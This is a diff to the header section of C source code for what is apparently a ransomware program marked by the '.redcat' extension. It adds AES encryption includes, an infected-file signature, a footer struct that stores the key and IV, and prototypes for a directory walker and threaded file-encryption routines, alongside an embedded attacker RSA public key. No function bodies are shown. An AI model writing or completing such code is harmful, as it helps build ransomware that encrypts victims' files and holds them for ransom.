@@ -10,6 +10,8 @@
 #include <dirent.h>
 #include <pthread.h>
 #include <sys/stat.h>
+#include <openssl/aes.h>
+#include <openssl/evp.h>
 
 /* if this is defined, then the vector will double in capacity each
  * time it runs out of space. if it is not defined, then the vector will
@@ -25,8 +27,9 @@
 #define AES_256 2
 #define AES_MODE_ECB 0
 #define AES_MODE_CBC 1
-#define MAX_MODE_LENGTH 8
 #define MAX_PATH_LENGTH 256
+#define CIPHER_MODE_LENGTH 8
+#define CIPHER_NAME_LENGTH 12
 
 /* Macro string literals */
 #define ATK_RSA_PUBLIC_KEY "-----BEGIN PUBLIC KEY-----\n" \
@@ -44,10 +47,31 @@
     "BUhaUPlEJGIFfpI0XB7J6CkCAwEAAQ==\n" \
     "-----END PUBLIC KEY-----"
 #define INFECTED_FILE_EXT ".redcat"
+#define INFECTED_FILE_SIG 0xBAADF00D
+
+typedef struct
+{
+    cvector_vector_type(char*) paths;
+    char* ciphername;
+} thread_args;
+
+typedef struct
+{
+    int signature;
+    int key_size;
+    int mode;
+    unsigned char* key;
+    unsigned char* iv;
+} footer;
 
 /* Prototype of functions */
 void print_usage();
 int is_infected_file(char* path);
-int is_valid_options(int* key_size, char* mode, char* target);
+int encryption_worker_proc(thread_args* args);
+int encrypt_file(char* path, char* ciphername);
+int gen_random_bytes(unsigned char* buf, int size);
+int is_valid_options(int key_size, char* mode, char* target);
 void walkdir(cvector_vector_type(char*)* paths, char* parent_dir);
+int do_encrypt(cvector_vector_type(char*)* paths, int key_size, char* mode);
 int parse_options(int* key_size, char* mode, char* target, int argc, char** argv);
+
